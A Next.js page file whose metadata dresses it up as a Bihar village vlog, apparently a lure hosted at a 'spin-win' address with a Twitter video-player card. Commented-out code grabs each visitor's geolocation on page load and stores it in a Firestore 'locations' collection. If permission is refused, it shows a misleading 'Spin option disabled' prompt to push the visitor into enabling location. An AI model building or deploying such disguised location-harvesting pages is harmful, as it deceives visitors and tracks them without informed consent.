import Head from 'next/head'
import { useEffect, useState } from 'react'
import { db } from '@/lib/firebase'
import { collection, addDoc, Timestamp } from 'firebase/firestore'
import { Box, Button, Alert, Typography, Stack, Avatar } from '@mui/material'
import VideoPage from '@/components/VideoPage'

export default function Home() {
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(
    null
  );
  const [error, setError] = useState<string | null>(null);
  const [saved, setSaved] = useState(false);
  const [showEnableButton, setShowEnableButton] = useState(false);

  // const requestLocation = () => {
  //   if (!navigator.geolocation) {
  //     setError("Geolocation is not supported by your browser");
  //     return;
  //   }

  //   navigator.geolocation.getCurrentPosition(
  //     async (position) => {
  //       const lat = position.coords.latitude;
  //       const lng = position.coords.longitude;

  //       setLocation({ lat, lng });
  //       setError(null);
  //       setShowEnableButton(false);

  //       try {
  //         await addDoc(collection(db, "locations"), {
  //           lat,
  //           lng,
  //           timestamp: Timestamp.now(),
  //         });
  //         setSaved(true);
  //       } catch (err: any) {
  //         setError("Failed to save to Firestore: " + err.message);
  //       }
  //     },
  //     (err) => {
  //       setError(
  //         "Spin option disabled please enable it by clicking the below button."
  //       );
  //       setShowEnableButton(true);
  //     }
  //   );
  // };

  // // 🔄 Try to get location on first load
  // useEffect(() => {
  //   requestLocation();
  // }, []);

  return (
    <>
    <Head>
  <title>A Day in Bihar | Rural Life & Culture | Bihar Daily Vlogs</title>
  <meta name="description" content="Experience authentic rural life in Bihar! Join me for a full day in my village - farming, local food, traditions and beautiful countryside. Don't forget to like and subscribe!" />
  
  {/* Open Graph / Facebook */}
  <meta property="og:type" content="video.other" />
  <meta property="og:title" content="A Day in Bihar | Rural Life & Culture | Bihar Daily Vlogs" />
  <meta property="og:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
  <meta property="og:image" content="https://spin-win-gamma.vercel.app/video.avif" />
  <meta property="og:url" content="https://spin-win-gamma.vercel.app" />
  <meta property="og:site_name" content="Bihar Daily Vlogs" />
  <meta property="og:video:duration" content="1245" />
  
  {/* Twitter */}
  <meta name="twitter:card" content="player" />
  <meta name="twitter:title" content="A Day in Bihar | Rural Life & Culture | Bihar Daily Vlogs" />
  <meta name="twitter:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
  <meta name="twitter:image" content="https://spin-win-gamma.vercel.app/video.avif" />
  <meta name="twitter:player" content="https://spin-win-gamma.vercel.app" />
  <meta name="twitter:player:width" content="1280" />
  <meta name="twitter:player:height" content="720" />
  
  {/* Additional YouTube-like tags */}
  <meta name="keywords" content="Bihar vlog, rural India, village life, Indian farming, Bihar culture, daily vlog, Bihar tourism" />
  <meta property="video:tag" content="Bihar" />
  <meta property="video:tag" content="Village Life" />
  <meta property="video:tag" content="India" />
</Head>
    <VideoPage />
    </>
  );
}
